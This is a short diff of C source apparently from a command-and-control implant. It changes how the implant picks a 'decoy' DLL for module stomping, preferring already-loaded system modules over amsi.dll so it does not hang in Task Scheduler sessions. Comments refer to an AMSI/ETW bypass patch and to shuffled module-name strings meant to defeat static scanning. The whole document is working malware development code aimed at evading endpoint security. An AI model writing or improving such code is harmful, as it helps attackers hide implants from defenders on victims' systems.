@@ -33,6 +33,8 @@
  * optional header, and section table for any reasonable DLL. */
 #define HEADER_PAGE_SIZE  0x1000
 
+static BOOL IsValidPe( IN PVOID Base );
+
 /*!
  * Load the decoy DLL into the current process (or find it if already loaded)
  * and return its base address.
@@ -44,14 +46,33 @@ static PVOID LoadDecoyModule( VOID )
 {
     PVOID DecoyBase = NULL;
 
-    /* Try amsi.dll first — it may already be loaded by AmsiEtwBypassPatch */
+    /* Try amsi.dll if already loaded by AmsiEtwBypassPatch. */
     if ( Instance->Modules.Amsi ) {
         return Instance->Modules.Amsi;
     }
 
-    /* Load amsi.dll using obfuscated name construction (same pattern as
-     * RtAmsi in Runtime.c).  Character order is shuffled to defeat static
-     * string scanning. */
+    /* Prefer an already-loaded Runtime module as the decoy.  Loading amsi.dll
+     * via LdrModuleLoad can hang under S4U Task Scheduler sessions (Session 0,
+     * no interactive desktop) because AMSI provider initialization may block
+     * waiting for a service that is not yet available in that logon session.
+     * Using an already-loaded module avoids any DLL load during init. */
+    {
+        PVOID Candidates[] = {
+            Instance->Modules.Sspicli,
+            Instance->Modules.Iphlpapi,
+            Instance->Modules.Gdi32,
+            Instance->Modules.Shell32,
+        };
+        for ( int i = 0; i < sizeof( Candidates ) / sizeof( Candidates[ 0 ] ); i++ ) {
+            if ( Candidates[ i ] && IsValidPe( Candidates[ i ] ) ) {
+                PUTS( "[MSTOMP] using already-loaded module as decoy" )
+                return Candidates[ i ];
+            }
+        }
+    }
+
+    /* Last resort: load amsi.dll.  Skipped when an already-loaded module was
+     * found above, which avoids the S4U hang path. */
     {
         CHAR ModuleName[ 9 ] = { 0 };
 
